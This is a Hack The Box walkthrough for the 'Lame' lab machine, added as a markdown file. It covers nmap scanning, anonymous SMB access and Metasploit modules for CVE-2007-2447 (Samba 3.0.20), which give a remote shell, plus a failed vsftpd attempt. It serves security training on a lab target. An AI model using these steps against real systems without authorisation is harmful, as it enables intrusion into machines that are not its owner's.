@@ -1,0 +1,152 @@
+## **Hack The Box - Lame**
+
+**Creator:**
+**Difficulty:** Easy
+**Link:** [Link to HTB-Lame](
+
+### Walkthrough
+---
+
+<ins>**Enumeration**</ins>
+
+Since Hackthebox provides us with the machines IP address there is no need to do an initial discovery scan on our network like with other vulnerable machines. 
+
+Instead for my first step I enumerate the services with open ports and try to figure out their versions. 
+
+`nmap -sV -sC <target_ip>` 
+
+Where <target_ip> is the IP address for the machine provided by hack the box. 
+
+![Service Enumeration Fail](/docs/assets/images/HTB/Lame/lame01.png)
+
+It can be seen from the results that the machine is blocking ping scans and that nmap suggests we try to use the -Pn switch. This switch tells nmap to diable host discover and to only scan ports.
+
+`nmap -sV -sC -Pn <target_ip>`
+
+![Enumeration Results](/docs/assets/images/HTB/Lame/lame02.png)
+
+\* Another thing that can be done is to output the scan results into a file, which along with taking screenshots can be handy for referencing later (For example here is an old screenshot of the first time I attempt to scan this machine)
+
+![Output Scan Results To A File](/docs/assets/images/HTB/Lame/lame03.png)
+
+The `-O` switch tells nmap to also try to discover the machines operating system.
+
+So the Results from the initial nmap scan are
+
+> Port 21 open to FTP traffic using version vsftpd
+> Port 22 open to SSH traffic using version OpenSSH 4.7p1
+> Port 139 open to smb traffic using version Samba 3.x - 4.x
+> Port 445 open to smb traffic using version Samba 3.0.20
+
+It's also possibly running Linux version 2.6 as it's Operating System.
+
+The *anonymous* credentials for smb do allow for a look into the machine, but with such low privileges there wasn't a whole lot I could find to do.
+
+```
+smbclient -L 10.10.10.3 
+smbclient \\\\10.10.10.3\\tmp
+When prompted for a password simply press enter
+
+```
+
+![smbclient1](/docs/assets/images/HTB/Lame/lame04.png)
+
+![smbclient2](/docs/assets/images/HTB/Lame/lame05.png)
+
+The files labeled exploit and vgauthsvclog.txt appeared to be intersting but after downloading and reading through them there wasn't much I was able to do.
+
+---
+
+
+<ins>**Known Exploits**</ins>
+
+*searchsploit* can be used to search for known exploits related to the service versions the nmap found. In this 2 known exploits that work with metasploit are found.
+
+The first is an exploit related to the ftp version.
+
+**CVE:**2011-2523 [Exploitdb Link](https://www.exploit-db.com/exploits/17491)
+**More Detailed Link:** [Detailed Link](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
+![ftp searchsploit](/docs/assets/images/HTB/Lame/lame06.png)
+
+The second one is related to the samba version
+**CVE:**2007-2447 [Exploitdb Link](https://www.exploit-db.com/exploits/16320)
+**More Detailed Link:** [Detailed Link](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
+![samba searchsploit](/docs/assets/images/HTB/Lame/lame07.png)
+
+As both of these exploits work with *Metasploit* it's fairly easy to test them.
+
+---
+
+<ins>**The Exploit That Works**</ins>
+
+
+Of the two exploits this machine appears to be vulnerable to I was only able to get the one that targets Samba 3.0.20 to work.
+
+This exploit is made for *Metasploit* so it's simple to execute. Enter the following to bring up the Metasploit Framework and search for the path to the exploit.
+
+```
+msfconsole
+search samba 3.0.20
+
+```
+
+![msfconsole and search](/docs/assets/images/HTB/Lame/lame08.png)
+![msfconsole and search](/docs/assets/images/HTB/Lame/lame09.png)
+
+In this case it's the first and only exploit that shows up so either enter `use 0` or `use <file_path>` to select the exploit. From there entering `options` will display all of the options that can be manually adjusted.
+
+![Samba Exploit Options](/docs/assets/images/HTB/Lame/lame10.png)
+
+The available options are *RHOSTS*, *RPORT*, *LHOST*, *LPORT*. For the purposes of this exploit the only two to be concerned with are *RHOSTS* and *LHOST* options. Enter the following options
+```
+set RHOSTS <target_ip>
+set LHOST <host_ip>
+```
+Where the <target_ip> is the IP address for the machine provided by Hack the box and <host_ip> represents the IP address associated with your machine.
+
+![Set Hosts](/docs/assets/images/HTB/Lame/lame11.png)
+\* I initially made a mistake here as it's *LHOST* not *LHOSTS*
+
+Then just enter `run` in the console and wait a moment while Metasploit works it's magic. Eventually your console will display a dialogue that looks similar to the one below and then you can start entering commands on the target machine.
+![Exploit](/docs/assets/images/HTB/Lame/lame12.png)
+
+`whoami`
+![whoami](/docs/assets/images/HTB/Lame/lame13.png)
+
+From there it's just using commands to explore the file system to find the flag.
+![Explore File System User](/docs/assets/images/HTB/Lame/lameuserflag.png)
+![Explore File System Root](/docs/assets/images/HTB/Lame/lame14.png)
+
+Copy the flag and submit it on Hackthebox and you're done.
+
+![Lame Pwn](/docs/assets/images/HTB/Lame/lamepwn.png)
+
+---
+
+<ins>**The Exploit That Didn't Work**</ins>
+
+I was not able to successfully execute the ftp vulnerability. After doing some searching online I mostly found a lot of blog posts very similar to this one expressing the same thing. So very briefly I'll provide a quick break down of my attempt to do so with screenshots and if anyone who happens to read this knows how to actually make the exploit work please update me in the comments.
+
+As this one is another Metasploit exploit the first thing to do is again open the msfconsole and search for the exploits file path.
+
+![msfconsole ftp](/docs/assets/images/HTB/Lame/lame15.png)
+
+From here it will be the same as before where we select the exploit by entering `use 0` or `use <file_path>` and then enter `options` to see the options available for this exploit.
+This time around the only concer is the *RHOSTS* options so enter `set RHOSTS <target_ip>`. I will usually enter `options` again just to verify I set everything correctly.
+
+![msfconsole ftp options](/docs/assets/images/HTB/Lame/lame16.png)
+
+From there simply enter `run` into the console and let Metasploit once again work it's magic. Eventually an error will display claiming the exploit was completed but no session was created.
+
+![msfconsole ftp error](/docs/assets/images/HTB/Lame/lame17.png)
+
+That's all there is to that one as far as I can tell. I found one blog post claiming that the exploit was just a backdoor that was patched out of that version and was only available for a short time. I really couldn't find a source on that information though.
+
+---
+
+<ins>**Final Thoughs**</ins>
+
+Not a whole lot. Lame is a relatively easy machine intended to be the first part of a *Beginner Track* offered by Hackthebox. I could see it being frustrating if you attempted the broken exploit first and got hung up on trying to make it work. I believe each of these exploits can also be executed manually if you'd like an additional challenge. Outside of that as far as I can tell Lame doesn't really have a whole lot going on with it.
+
+
+
